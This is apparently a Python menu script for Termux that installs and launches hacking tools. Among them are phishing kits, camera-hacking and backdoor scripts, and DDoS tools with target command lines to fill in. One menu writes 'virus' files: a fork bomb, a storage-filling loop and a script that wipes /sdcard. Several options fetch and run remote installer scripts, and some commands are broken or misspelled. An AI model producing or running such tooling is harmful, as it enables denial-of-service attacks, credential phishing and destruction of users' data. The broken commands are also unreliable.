import gtts,compileall,pytube,time,os,socket,requests
os.system('clear')
tts = gtts.gTTS('Welcome to the world of programming and technology', lang='en')
tts.save('h.mp3')
os.system('play h.mp3')
os.system('clear')
time.sleep(2)
print('Welcome to the world of programming and technology')
time.sleep(3)
os.system('clear')
os.system('figlet khaled\n')
BYellow='\033[1;33m'
print(BYellow)
print('programmers is : @h_e_x_0 and @KhaledHussien1\n')
print('My channel on Telegram : https://t.me/+ypLV80YHXoE4NGZk\n')
Cyan='\033[0;36m'
print(Cyan)
os.system('clear')

rr="\033[1;30m"
to="\033[1;31m"
cc="\033[1;32m"
dd="\033[1;34m"

ee="\033[1;34m"
ff="\033[1;35m"
gg="\033[1;36m"

def color():
        os.system("clear")
        os.system('figlet khaled\n')
        BYellow='\033[1;33m'
        print(BYellow)
        print('programmers is :@KhaledHussien1 and @h_e_x_0\n')
        print('My channel on Telegram : https://t.me+ypLV80YHXoE4NGZk\n')
        Cyan='\033[0;36m'
        print(Cyan)
        
        print(Cyan)
		

a = None

l = None


	
def mainn():
    global a
    
    while True:
        color()
        write()
        if a == '00':
            break
        elif a in ('1', '2', '3', '4','5'  ,'00'):
         
        
            break
        else:            
            print(to+"Invalid input, please try again")
            time.sleep(2)
            print(Cyan)




def write():
	global a
	print('1)command_linux       ')
	print('2)tool_linux          ')
	print('3)DDos Attack         ')
	print('4)Linux distributions \n5)New Tool')
	print('00)Exit               ')
	a=input('select :')
	
	
mainn()	


#######################################
# main
red='\033[1;31m'
if a == '00':
   os.system('exit')
def command_linux():
    if a =='1':
       os.system('clear')
       os.system('clear')
       print('*'*30)
       print('ls         this command show the files \n')
       print('pwd        this command show the path  \n')
       print('clear      this command to clean the screen  \n')
       print('ls -l      this Command to display files and the date they were created  \n')
       print('rm -rif *  this command delete all thing   \n')
       print('date       this command show date  \n')
       print('cat <file name>   This command displays the text inside the file\n')
       print('touch <file name> this command create file\n')
       print('mkdir <file name> this command create folder\n')
       print('rm <file name> this command delete file\n')
       print('rm -rif <folder name> this command delete any folder\n')
       print('nano <file name> this command edit on the text inside the file\n')
       print('whatis <command> this command To know the uses of it \n')
       print('wc -w <file name> this command To know the number of words in the file \n')
       print('wc -l <file name> this command To know the number of lines of the file \n')
       print('wc -m <file name> this command To find out how many characters are in the file\n') 
       print('wc -c <file name> this command To know the size of the file in bits\n')
       print('ls -a      this command  To display hidden files\n')
       print('chmod +x * this command To give permissions to the file\n')
       print('head <file name> this command Displays the first lines of the file\n')
       print('history    this command To see all the commands that you wrote before\n')                                
       print('tail <file name>  this command Displays the last lines in the file \n')
       print('echo <text> this command to print text \n')
       print('ifconfig    this command to to display the internal ip\n')
       print('cd <folder name> this command to enter the folder\n')
       print('don‘t write <>\n')
       print('*'*30)
       print('99)main menu ')
       print('00)EXIT')
       
   
       
       while True:
        l=input('select :')
        
        
        if l == '00':
       
        	break
        elif l in ('1', '2', '3', '4','5','00', '99'):
        	break
        	
        else:
        	print(to+"Invalid input, please try again")
        	print(Cyan)	

       
       if l == '99':
          os.system('python t1.py')
          
         
       if l == '00':
          os.system('exit')
command_linux()
if a == '2':
         os.system('clear')
         color()
         print('0)metasploit')
         print('1)hydra')
         print('2)nmap')
         print('3)crunch')
         print('4)wifite')
         print('5)aircrack-ng')
         print('6)cupp')
         print('7)sqlmap')
         print('8)create backdoor')
         print('9)Information about the ip')
         print('10)detect location')
         print('11)lazymux')
         print('12)Fake pages')
         print('13)hack camera')
         print('14)whois')
         print('15)sublist3r')
         print('16)dmitry')
         print('17)whatweb')
         print('18)hashcat')
         print('19)john The ripper')
         print('20)recon-ng')
         print('21)websploit')
         print('22)netcat')
         print('23)nikto')
         print('24)Apktool')
         print('25)adb to check the system')
         print('26)setoolkit')
         print('27)zphisher')
         print('28)WishFish')
         print('29)beff')
         print('30)tool to work hash and decrypt the hash ')
         print('31)Identify the type of hash ')
         print('99)main menu ')
         print('00)EXIT')
         while True:
          m=input('select :')
        
        
          if m == '00':
      
          	break
          elif m in ('1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21', '22', '23', '24', '25', '26', '27', '28', '29', '30', '31','00', '99','0'):
          	break
          else:	                
          	print(to+"Invalid input, please try again")
          	print(Cyan)	

         
         
         
         
         if m == '1':
            os.system('clear')
            print('copy and paste this command')      
            print('*'*20)
            print('apt update')
            print('apt install hydra')
            print('clear')
            print('hydra --help')
            print('*'*20) 
            os.system('proot-distro login ubuntu')
         if m == '2':
            os.system('pkg update && pkg install nmap && clear && nmap --help')
         if m == '3':
            os.system('pkg update && pkg insall crunch && clear && crunch --help')
         if m =='4':
            os.system('clear')            
            print('copy and paste this command')
            print('*'*20)
            print('apt update')
            print('apt install wifite')
            print('wifite')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '5':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update \napt install aircrack-ng \naircrack-ng')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '6':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update')
            print('apt install cupp')
            print('cupp -i')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m =='7':
             os.system('clear')
             print('copy and paste this command')
             print('*'*20)
             print('apt update')
             print('apt install sqlmap')
             print('sqlmap')
             print('*'*20)
             os.system('proot-distro login ubuntu')
         if m == '8':
            os.system('pkg update && pkg install git && pkg install python python2 &&git clone https://github.com/Ledear-Hacker/LEDEAR_HACKING ')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd LEDEAR_HACKING')
            print('python2 ledearhacking.py')
            print('*'*20)
         if m == '9':
            os.system('pkg update && pkg install git &&  pkg install python python3 && git clone https://github.com/noob-hackers/ipdrone')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd ipdrone')
            print('python3 ipdrone.py -v <ip>')
            print('*'*20)
         if m == '10':
            os.system('pkg update && pkg install git && pkg install php && pkg install python python3 && git clone https://github.com/thewhiteh4t/seeker.git')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd seeker\nchmod +x install.sh\n./install.sh\npython3 seeker.py')
            print('*'*20)
         if m == '11':
            os.system('pkg update && pkg install python && git clone https://github.com/Gameye98/Lazymux')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd Lazymux\npython lazymux.py')
            print('*'*20)
         if m == '12':
            os.system('git clone https://github.com/KasRoudra/PyPhisher')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd PyPhisher\npip3 install -r files/requirements.txt\npython3 pyphisher.py\n')
            print('*'*20)
         if m == '13':
            os.system('git clone https://github.com/hackermohamedPro/ALIENS.HaCK.Camera')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd ALIENS.HaCK.Camera\nbash alienshack.sh')
            print('*'*20)
         if m == '14':
            os.system('pkg install whois && clear && whois --help')
         if m == '15':
            os.system('git clone https://github.com/aboul3la/Sublist3r.git')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd Sublist3r\npip install -r requirements.txt\npython3 sublist3r.py -d <domain>')
            print('*'*20)
         if m =='16':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install dmitry\nclear\ndmitry --help')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '17':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install whatweb\nclear\nwhatweb')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '18':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install hashcat\nclear\nhashcat')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '19':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install john\nclear\njohn')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '20':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install recon-ng\nrecon-ng')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '21':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install websploit\nwebsploit')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '22':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install netcat\nclear\nnetcat')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '23':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install nikto\nclear\nnikto')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '24':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('apt update\napt install apktool')
            print('*'*20)
            os.system('proot-distro login ubuntu')
         if m == '25':
            os.system('wget https://github.com/MasterDevX/Termux-ADB/raw/master/InstallTools.sh && bash InstallTools.sh && clear && adb')
         if m == '26':
            os.system('git clone https://github.com/jithender2/SET-Installer.git ')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd SET-Installer\nchmod +x setup.sh\n./setup.sh\nsetoolkit')
            print('*'*20)
         if m == '27':
            os.system('git clone https://github.com/htr-tech/zphisher')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd zphisher\nchmod +x *\nbash zphisher.sh')
            print('*'*20)
         if m == '28':
            os.system('git clone https://github.com/kinghacker0/WishFish')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd WishFish\nbash wishfish.sh')
            print('*'*20)
         if m == '29':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('download this file https://www.mediafire.com/file/clwj0wg414yxoj7/Installer.sh/file')
            print('after download write cd /sdcard/Download\ncp Installer.sh $HOME\ncd\nbash Installer.sh\ncd beef\nnano config.yaml put password and user cool\nbeef\ngo to browser http://127.0.0.1:3000/ui/panel')
            print('*'*20)
         if m == '0':
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd ..\ncd usr\nmkdir opt\ncd\nwget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh\nchmod +x  metasploit.sh\nbash metasploit.sh')
            print('*'*20)
         if m == '30':
            os.system('git clone https://github.com/DatabaseHk/Lanablackhatis')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd Lanablackhatis\npython2 LANA_X.py')
            print('*'*20)
         if m == '31':
            os.system('git clone https://github.com/blackploit/hash-identifier')
            os.system('clear')
            print('copy and paste this command')
            print('*'*20)
            print('cd hash-identifier\npython hash-id.py')
            print('*'*20)
         if m == '99':
            os.system('python t1.py')
         if m == '00':
            os.system('exit')

if a == '3':
   os.system('clear')
   color()
   print('1)HAMMER')
   print('2)LITEDDOD')
   print('3)slowloris')
   print('4)HULK')
   print('5)DDoS-Ripper')
   print('99)main menu ')
   print('00)EXIT')
   
   while True:
    r=input('select :')
        
        
    if r == '00':
        break
       
       
    elif r in ('1', '2', '3', '4','5','00', '99'):
        break
    else:
     print(to+"Invalid input, please try again")
     print(Cyan)
     
     
     		

   
   
   if r == '1':
      os.system('git clone https://github.com/cyweb/hammer')
      os.system('clear')
      print('copy and paste this command')
      print('*'*20)
      print('cd hammer\nchmod +x hammer.py\npython3 hammer.py -s [IP target] -p [80] -t [135]')
      print('*'*20)
   if r == '2':
      os.system('git clone https://github.com/4L13199/LITEDDOS')
      os.system('clear')
      print('copy and paste this command')
      print('*'*20)
      print('cd LITEDDOS\npython2 LITEDDOS.py <ip> <port> <packet>')
      print('*'*20)
   if r == '3':
      os.system('git clone https://github.com/gkbrk/slowloris')
      os.system('clear')
      print('copy and paste this command')
      print('*'*20)
      print('cd slowloris\npython3 slowloris.py -v <ip> -s <socket> -p <port>')
      print('*'*20)
   if r == '4':
      os.system('git clone https://github.com/R3DHULK/HULK')
      os.system('clear')
      print('copy and paste this command')
      print('*'*20)
      print('cd HULK\npython hulk.py')
      print('*'*20)
   if r == '5':
      os.system('git clone https://github.com/palahsu/DDoS-Ripper.git')
      os.system('clear')
      print('copy and paste this command')
      print('*'*20)
      print('cd DDoS-Ripper\npython3 DRipper.py -s <ip> -p <port>')
      print('*'*20)
   if r == '99':
      os.system('python t1.py')
   if r == '00':
      os.system('exit')
if a == '4':
   os.system('clear')
   color()
   print('1)root_termux')
   print('2)kali-linux')
   print('3)ubuntu')
   print('4)parrot os')
   print('5)fedora')
   print('99)main menu ')
   print('00)EXIT')
   
   while True:
    k=input('select :')
        
        
    if k == '00':
        break
       
       
    elif k in ('1', '2', '3', '4','5','00', '99'):
        break
    else:
     print(to+"Invalid input, please try again")
     print(Cyan)
     
     
   
   
   if k == '1':
      os.system('clear')
      os.system('proot-distro login ubuntu')
   if k == '2':
      os.system('clear')
      print('copy and paste this command')
      print('*'*20)
      print('wget -O install-nethunter-termux https://offs.ec/2MceZWr\nchmod +x install-nethunter-termux\n./install-nethunter-termux')
      print('*'*20)
      print('choose number 1\nif found y or N  choose N \nif you want turn on Graphical interface write kex passwd and enter password and write kex &')
   if k == '3':
      print('after installtion turn on Graphical interface vncserver')
      time.sleep(5)
      os.system('pkg update -y && pkg install wget curl proot tar -y && wget https://raw.githubusercontent.com/AndronixApp/AndronixOrigin/master/Installer/Ubuntu20/ubuntu20-xfce.sh -O ubuntu20-xfce.sh && chmod +x ubuntu20-xfce.sh && bash ubuntu20-xfce.sh')   
   if k == '4':
      os.system('git clone https://github.com/RiSecID/parrot-in-termux.git')
      os.system('clear')
      print('copy and paste this command')
      print('*'*20)
      print('cd parrot-in-termux')
      print('chmod +x parrot.sh')
      print('./parrot.sh')
      print('apt update \napt install git')
      print('apt install xfce4 xfce4-whiskermenu-plugin xfce4-terminal -y')
      print('apt install  tigervnc-standalone-server -y')
      print('apt install dbus-x11\nvncserver')
      print('*'*20)
   if k == '5':
      os.system('pkg update -y && pkg install wget curl proot tar -y && wget https://raw.githubusercontent.com/AndronixApp/AndronixOrigin/master/Installer/Fedora/fedora-xfce.sh -O fedora-xfce.sh && chmod +x fedora-xfce.sh && bash fedora-xfce.sh')
   if k == '99':
      os.system('python t1.py')
   if k == '00':
      os.system('exit')

def New_Tool():
    i = None
    global a
    if a == '5' :
    	os.system('clear')
    	print(color())
    	print('1)Get a website design')
    	print('2)Phone crash virus')
    	print('3)Evening virus space phone')
    	print('4)Virus to delete all files')
    	print('5)Download videos from YouTube')
    	print('6)Encryption of Python scripts and tools')
    	print('7)Identification of the speed of the Internet ')
    	print('8)Get the website ip ')
    	print('99)main menu')
    	print('00)Exit')
    	
        
        
        
        
   	    
    	
    
                  
    
    
    
    
    
    
    
    while a== '5':
     i=input('select :')
     if  i == '00':
     	break
     elif i in ('1', '2', '3', '4','5', '6', '7', '8','00', '99'):
           break
     else:
         print(to+"Invalid input, please try again")
         print(Cyan)
     
                       
              
     
     
    
    
    
    if i == '00':
       os.system('exit')
    elif i == '99':
         os.system('python t1.py')    
    elif i == '1':
         os.system('pkg update && pkg install python python3 && pip install requests')
         os.system('clear')
         def kali():
             global m
             a = input('Enter url website :')
             p = requests.get(a)
             m = (p.text)
         kali()
         def kali2():
             r = open('information.html', 'w')
             r.write(m)
             r.close()
             print('the design saved in file information.html')
         kali2()
    elif i == '2':
         with open("virus1.py", "w") as file:
              file.write('while True:\n')
              file.write('       os.fork()')
         print('the virus saved in virus1.py')
    elif i == '3':
         with open("virus2.py", "w") as file:
              file.write('for i in range(999999999999999999999999999999999999999999999999):\n')
              file.write('      with open(f"file{i}.txt", "w") as f:\n')
              file.write('            f.write("This is a test file.")')
         print('the virus saved in file virus2.py')
    elif i == '4':
         with open("virus3.py", "w") as file:
              file.write('import os \n')
              file.write('os.system("termux-setup-storage")\n')
              file.write('os.system("cd /sdcard")\n')
              file.write('os.system("rm -rif *")')
              print('the virus saved in virus3.py')
    elif i == '5':
         os.system('pkg update && pkg install python3 && pip install pytube && clear')
         a = input('Enter url video :')
         link = (a)
         yt = pytube.YouTube(link)
         stream = yt.streams.filter(res="1080p").first()
         stream.download()
         print('The video has been uploaded ')
    elif i == '6':
         os.system('clear')
         a=input('Enter the File =>')
         compileall.compile_file(a)
         print('the script encoder inside folde __pycache__')
    elif i == '7':

         os.system('pip install speedtest-cli')
        
         os.system('clear')        

         import speedtest

         print('please wait....\n')

         st = speedtest.Speedtest()

         download_speed = st.download() / 1048576
         upload_speed = st.upload() / 1048576
         ping = st.results.ping

         print(f"Download speed: {download_speed:.2f} Mbps")
         print(f"Upload speed: {upload_speed:.2f} Mbps")
         print(f"Ping: {ping:.2f} ms")
         print('Done..')
    elif i == '8':
         os.system('clear')
         z=input('enter url website without https:// :')
         host=socket.gethostbyname(z)
         import datetime
         print('scan start in ' + str( datetime.datetime.utcnow()))
         print(f'ip is : {host}')
         
         
#if a == 5 :
New_Tool()
	         
#mainn()	
#######################################
# special functions
